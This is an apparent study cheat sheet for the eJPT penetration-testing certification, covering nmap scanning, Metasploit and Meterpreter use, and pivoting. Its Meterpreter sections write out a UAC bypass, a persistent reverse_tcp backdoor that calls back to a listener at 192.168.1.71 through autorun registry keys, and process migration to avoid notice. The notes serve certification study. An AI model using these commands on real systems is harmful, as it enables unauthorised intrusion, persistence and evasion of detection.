# eJPT
Some helps to pass eJPT
# Information Gathering
## Subdomain Enumeration
```
root@kali:~# sublist3r -v -d yahoo.com -w /usr/share/wordlists/
```
or we can use -b to bruteforce

we can enumerate the subdomains like FUZZ.thetoppers.htb with gobuster
```
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
# Footprinting & Scanning

## Ping Sweep
You can scan all network with nmap, -sn to disable port scan
```
root@kali:~# nmap -sn -n 10.142.111.0/24
```
but you can scanning entire network with fping
```
root@kali:~# fping -a -g 10.142.111.0/24 2> /dev/null
```
# Nmap
## OS Fingerprinting
```
nmap -Pn -A -O 10.10.10.10
```
## Quick scan
```
nmap -sC -sV -A -T4 10.10.10.10 --open
```
## Full scan
```
nmap -sC -sV -A -T4 -p- 10.10.10.10 --open
```

nmap vuln scan example:
--script-args=unsafe=1 is used if you don't want to "crash" the system.
```
nmap --script vuln --script-args=unsafe=1 -iL hosts.txt
```
# Spotting a firewall

If an nmap TCP scan identified a well-known service, such as a web server, but cannot detect the version, then there may be a firewall in place.

```
For example:
PORT    STATE  SERVICE  REASON          VERSION
80/tcp  open   http?    syn-ack ttl 64
```

Another example:

```
80/tcp  open   tcpwrapped 
```
“tcpwrapped” means the TCP handshake was completed, but the remote host closed the connection without receiving any data.

These are both indicators that a firewall is blocking our scan with the target!

Tips:

Use “–reason” to see why a port is marked open or closed
If a “RST” packet is received, then something prevented the connection - probably a firewall!

# httprint

httprint banner grabling:
```
httprint -P0 -s /usr/share/httprint/signatures.txt -h 10.10.10.15
```

# Metasploit
Start metasploit with

```
$ msfconsole
```
# Meterpreter
## Privileges Escalation
On windows machine
```
meterpreter> getsystem
```
if doesn't work, probably windows has UserControlAccess enabled,so:
```
meterpreter> run post/windows/gather/win_privs
```
look if is true, and then
```
meterpreter> background
msf exploit(handler)> search uac
```
```
msf exploit(handler)> use exploit/windows/local/bypassuac
msf exploit(handler)> sessions
msf exploit(handler)> set SESSION <n>
msf exploit(handler)> exploit
meterpreter> getsystem
```
## Persistence
```
meterpreter > run persistence -h

[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.
[!] Example: run post/windows/manage/persistence_exe OPTION=value [...]
Meterpreter Script for creating a persistent backdoor on a target host.

OPTIONS:

    -A        Automatically start a matching exploit/multi/handler to connect to the agent
    -L   Location in target host to write payload to, if none %TEMP% will be used.
    -P   Payload to use, default is windows/meterpreter/reverse_tcp.
    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
    -T   Alternate executable template to use
    -U        Automatically start the agent when the User logs on
    -X        Automatically start the agent when the system boots
    -h        This help menu
    -i   The interval in seconds between each connection attempt
    -p   The port on which the system running Metasploit is listening
    -r   The IP of the system running Metasploit listening for the connect back
```
We will configure our persistent Meterpreter session to wait until a user logs on to the remote system and try to connect back to our listener every 5 seconds at IP address 192.168.1.71 on port 443.
```
meterpreter > run persistence -U -i 5 -p 443 -r 192.168.1.71
[*] Creating a persistent agent: LHOST=192.168.1.71 LPORT=443 (interval=5 onboot=true)
[*] Persistent agent script is 613976 bytes long
[*] Uploaded the persistent agent to C:\WINDOWS\TEMP\yyPSPPEn.vbs
[*] Agent executed with PID 492
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
[*] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
[*] For cleanup use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
meterpreter >
```
To verify that it works, we reboot the remote system and set up our payload handler.
```
meterpreter > reboot
Rebooting...
meterpreter > exit

[*] Meterpreter session 3 closed.  Reason: User exit
msf exploit(ms08_067_netapi) > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.71
LHOST => 192.168.1.71
msf exploit(handler) > set LPORT 443
LPORT => 443
msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.1.71:443
[*] Starting the payload handler...
```
## Migrate PID to another PID to look less sus
```
meterpreter> getpid
meterpreter> ps -U SYSTEM //process with system privilege, choose one
meterpreter> migrate PID
```
# Pivoting
When we get access into a machine, we can check with ifconfig if there is another network which we couldn't access.
So let add the route to this network in msfconsole.
```
meterpreter> run autoroute -h
```
autoroute allow us to add a route to the network.
```
route add 192.69.228.0 255.255.255.0 1
```
for adding manually a route on msfconsole:

add //the command

subnet //subnet to connect

netmask //netmask of the subned

sid //meterpter session id

# SQLI
Intresting link with SQLI payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass
